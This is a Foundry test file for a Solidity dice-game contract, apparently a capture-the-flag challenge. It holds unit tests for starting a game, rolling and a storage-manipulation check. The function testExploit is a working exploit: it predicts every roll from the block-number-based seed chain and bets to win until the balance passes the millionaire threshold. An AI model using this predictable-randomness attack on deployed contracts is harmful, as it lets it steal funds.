// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Dice.sol";

contract DiceTest is Test {
    Dice dice;
    address player = address(0x123);

    event logTimestamp(uint256 timestamp);
    event logBlockNumber(uint256 blockNumber);

    function setUp() public {
        vm.prank(player);
        dice = new Dice();
        vm.deal(player, 1 ether); // Fund player with ETH for transactions
    }

    function testStartGame() public {
        vm.prank(player);

        dice.startGame();

        (bytes32 clientSeed, uint32 remainingRolls) = dice.games(player);
        assertTrue(clientSeed != 0);
        assertTrue(remainingRolls == 32767);
    }

    function testRollDice() public {
        vm.prank(player);
        dice.startGame();
        
        uint256 initialBalance = dice.balances(player);
        uint256 wager = 10;
        uint16 rollOver = 500;
        
        vm.prank(player);
        dice.rollDice(wager, rollOver);

        uint256 newBalance = dice.balances(player);
        assertTrue(newBalance != initialBalance);
    }

    function testAmIMillionerNow() public {
        vm.prank(player);
        dice.startGame();
        
        vm.prank(player);
        bool isMillionaire = dice.amIMillionerNow();
        assertFalse(isMillionaire);

        // Manually modify balance storage
        vm.store(address(dice), keccak256(abi.encode(player, uint256(1))), bytes32(uint256(1337007)));

        vm.prank(player);
        isMillionaire = dice.amIMillionerNow();
        assertTrue(isMillionaire);
    }

    function testExploit() public {
        emit logTimestamp(block.timestamp);
        emit logBlockNumber(block.number);

        vm.prank(player);
        bytes32 clientSeed = dice.initialSeed(block.number);

        vm.prank(player);
        bytes32[] memory serverSeedChain = new bytes32[](32767);
        serverSeedChain[0] =
            keccak256(abi.encodePacked(dice.initialSeed(block.number + 1)));

        for (uint32 i = 1; i < 32767; i++) {
            serverSeedChain[i] = keccak256(abi.encodePacked(serverSeedChain[i - 1]));
        }

        vm.prank(player);
        dice.startGame();

        for (uint32 i = 32767 - 1; i > 0; i--) {
            bytes32 gameHash = dice.getGameHash(serverSeedChain[i], clientSeed);
            uint256 roll = dice.getRoll(gameHash);
            
            uint256 balance = dice.balances(player);
            assertTrue(balance > 0);

            uint256 wager = 100;
            uint16 rollOver = uint16(roll - 1 == 0 ? 1 : roll - 1);

            vm.prank(player);
            dice.rollDice(wager, rollOver);

            vm.prank(player);
            if (dice.balances(player) > 1337006) {
                break;
            }
        }

        vm.prank(player);
        bool isMillionaire = dice.amIMillionerNow();
        assertTrue(isMillionaire);
    }
}
